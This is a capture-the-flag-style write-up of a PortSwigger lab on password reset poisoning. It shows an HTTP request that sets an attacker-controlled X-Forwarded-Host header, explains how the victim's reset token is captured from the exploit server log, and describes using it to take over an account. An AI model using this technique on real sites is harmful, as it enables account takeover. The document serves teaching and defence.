# Password Reset Poisoning via Middleware

## Overview

This lab demonstrates a **password reset poisoning** vulnerability caused by trusting the `X-Forwarded-Host` HTTP header when generating password reset links.

The vulnerability allows an attacker to obtain a victim's password reset token by causing the application to generate the reset link using an attacker-controlled host.

## Lab Objective

The objective was to log in to **Carlos's account** by exploiting the password reset functionality.

The lab provides the credentials:

```text
wiener:peter
```

The email client associated with the attacker-controlled account can be accessed through the exploit server.

## Vulnerability

The application uses the `X-Forwarded-Host` header when constructing password reset URLs.

If an attacker can control this header, they can make the application generate a password reset link pointing to an attacker-controlled server.

When the victim clicks the poisoned link, their browser sends the password reset token to the attacker's server.

## Attack Flow

```text
Attacker requests password reset for Carlos
                ↓
Attacker adds X-Forwarded-Host
                ↓
Application generates poisoned reset link
                ↓
Carlos receives the reset email
                ↓
Carlos clicks the reset link
                ↓
Reset token is sent to attacker's server
                ↓
Attacker obtains Carlos's reset token
                ↓
Attacker uses the token on the legitimate application
                ↓
Carlos's password is changed
                ↓
Attacker logs in as Carlos
```

## Exploitation

### 1. Request a password reset

Send a password reset request for the victim account:

```text
username=carlos
```

### 2. Poison the reset URL

Modify the request by adding an attacker-controlled `X-Forwarded-Host` header:

```http
X-Forwarded-Host: <attacker-exploit-server>
```

Example:

```http
POST /forgot-password HTTP/2
Host: <lab-host>
X-Forwarded-Host: <attacker-exploit-server>
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### 3. Victim accesses the poisoned link

The application generates a password reset link using the attacker-controlled host.

When Carlos clicks the link, his browser requests the reset endpoint on the attacker's exploit server.

The request contains Carlos's temporary password reset token:

```text
GET /forgot-password?temp-forgot-password-token=<TOKEN>
```

### 4. Capture the token

The token can be observed in the exploit server's access log.

The important part is the request containing:

```text
temp-forgot-password-token=<TOKEN>
```

### 5. Use the stolen token

The attacker takes Carlos's reset token and uses it against the legitimate lab application.

The attacker can then set a new password for Carlos.

### 6. Log in as Carlos

Finally, log in using:

```text
Username: carlos
Password: <new-password>
```

The lab is solved once access to Carlos's account is obtained.

## Why It Works

The application incorrectly trusts the `X-Forwarded-Host` header when constructing password reset URLs.

Because the attacker can influence the hostname in the generated link, the reset token is sent to an attacker-controlled server when the victim clicks the link.

The core security issue is therefore:

```text
Untrusted Host Header
        ↓
Poisoned Password Reset URL
        ↓
Reset Token Leakage
        ↓
Account Takeover
```

## Key Takeaways

* Password reset links must be generated using a trusted, canonical hostname.
* Security-sensitive tokens should never be exposed to attacker-controlled domains.
* `X-Forwarded-Host` and other proxy-related headers should not automatically be trusted.
* Password reset functionality can become an account takeover vector when reset tokens are leaked.

## Tools

* Burp Suite
* PortSwigger Web Security Academy
* Browser
* Exploit Server

## Vulnerability Classification

**Category:** Authentication

**Vulnerability:** Password Reset Poisoning

**Impact:** Password reset token disclosure and potential account takeover

## Disclaimer

This write-up documents testing performed against an intentionally vulnerable PortSwigger Web Security Academy lab for educational purposes.
